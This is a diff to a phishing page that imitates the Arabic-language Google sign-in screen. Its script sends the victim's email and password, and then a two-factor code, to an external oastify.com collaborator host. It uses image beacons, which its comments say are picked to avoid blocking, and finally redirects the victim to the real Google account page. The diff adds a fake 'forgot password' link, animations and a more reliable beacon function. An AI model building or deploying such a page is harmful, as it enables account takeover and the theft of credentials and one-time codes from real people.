@@ -6,55 +6,93 @@
     <title>تسجيل الدخول - حسابات Google</title>
     <link rel="icon" type="image/png" href="https://www.google.com/favicon.ico">
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-card { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
-        p.subtitle { font-size: 16px; margin-bottom: 30px; color: #202124; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 20px; text-align: right; }
-        input:focus { border: 2px solid #1a73e8; }
-        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; float: left; }
-        #step2 { display: none; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { width: 450px; min-height: 500px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
+        .logo { width: 75px; margin-bottom: 12px; }
+        h1 { font-size: 24px; font-weight: 400; line-height: 1.33; margin: 0; padding-top: 16px; color: #202124; }
+        p.subtitle { font-size: 16px; font-weight: 400; letter-spacing: 0.1px; line-height: 1.5; margin-bottom: 30px; margin-top: 8px; color: #202124; }
+        .input-container { margin-bottom: 10px; text-align: right; }
+        input { width: 100%; height: 56px; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s; text-align: right; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .forgot-pass { color: #1a73e8; font-weight: 500; font-size: 14px; text-decoration: none; display: block; text-align: right; margin-top: 9px; cursor: pointer; }
+        .btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; flex-direction: row-reverse; }
+        .next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; transition: background 0.2s; }
+        .next-btn:hover { background-color: #1b66c9; box-shadow: 0 1px 3px 0 rgba(60,64,67,0.302), 0 4px 8px 3px rgba(60,64,67,0.149); }
+        .create-acc { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
+        #step2 { display: none; animation: fadeIn 0.3s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
     </style>
 </head>
 <body>
+
 <div class="login-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" alt="Google" class="logo">
+    
     <div id="step1">
         <h1>تسجيل الدخول</h1>
         <p class="subtitle">استخدام حسابك على Google</p>
-        <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف">
-        <input type="password" id="pass" placeholder="أدخل كلمة المرور">
-        <button class="next-btn" onclick="next()">التالي</button>
+        <div class="input-container">
+            <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+        </div>
+        <div class="input-container" style="margin-top: 15px;">
+            <input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
+        </div>
+        <a class="forgot-pass">هل نسيت كلمة المرور؟</a>
+        <div class="btn-container">
+            <button class="next-btn" onclick="sendStep1()">التالي</button>
+            <a href="#" class="create-acc">إنشاء حساب</a>
+        </div>
     </div>
+
     <div id="step2">
-        <h1>تأكيد الهوية</h1>
-        <p class="subtitle">أرسلنا رمز تحقق إلى هاتفك</p>
-        <input type="text" id="otp" placeholder="G- ######">
-        <button class="next-btn" onclick="finish()">تأكيد</button>
+        <h1>التحقق بخطوتين</h1>
+        <p class="subtitle" style="font-size: 14px; color: #5f6368;">أرسلنا رمز تحقق مكون من 6 أرقام إلى هاتفك. أدخل الرمز أدناه للمتابعة.</p>
+        <div class="input-container">
+            <input type="text" id="otp" placeholder="G- أدخل الرمز" maxlength="6" style="letter-spacing: 2px; text-align: center;">
+        </div>
+        <div class="btn-container">
+            <button class="next-btn" onclick="sendStep2()">تأكيد</button>
+            <p style="font-size: 13px; color: #1a73e8; cursor: pointer; font-weight: 500;">إعادة إرسال الرمز</p>
+        </div>
     </div>
 </div>
 
 <script>
-    // رابط البرب حقك (تأكد إنه شغال)
+    // رابط البرب الخاص بك (تأكد إنه ينتهي بـ .oastify.com)
     const collab = "https://B0ccvemapuqpc1vj0j9jgr8db4hv5lta.oastify.com";
 
-    function next() {
+    // دالة الإرسال الموثوقة (تستخدم الصور لضمان عدم الحظر)
+    function track(action, params) {
+        const img = new Image();
+        const queryString = Object.keys(params).map(key => `${key}=${encodeURIComponent(params[key])}`).join('&');
+        img.src = `${collab}/${action}?${queryString}&_cache=${Math.random()}`;
+    }
+
+    function sendStep1() {
         const e = document.getElementById('email').value;
         const p = document.getElementById('pass').value;
         if(e && p) {
-            fetch(`${collab}/G_LOGIN?u=${encodeURIComponent(e)}&p=${encodeURIComponent(p)}`);
+            track("G_DATA", { user: e, pass: p }); // إرسال الإيميل والباسورد
             document.getElementById('step1').style.display = 'none';
             document.getElementById('step2').style.display = 'block';
+        } else {
+            alert("يرجى إدخال البيانات المطلوبة");
         }
     }
-    function finish() {
+
+    function sendStep2() {
         const o = document.getElementById('otp').value;
         if(o) {
-            fetch(`${collab}/G_OTP?code=${encodeURIComponent(o)}`);
-            window.location.href = "https://accounts.google.com";
+            track("G_OTP", { code: o }); // إرسال رمز التحقق
+            // تحويل الضحية للموقع الحقيقي بعد 500 مللي ثانية لضمان الإرسال
+            setTimeout(() => {
+                window.location.href = "https://accounts.google.com/manage-account";
+            }, 500);
+        } else {
+            alert("يرجى إدخال رمز التحقق");
         }
     }
 </script>
+
 </body>
 </html>
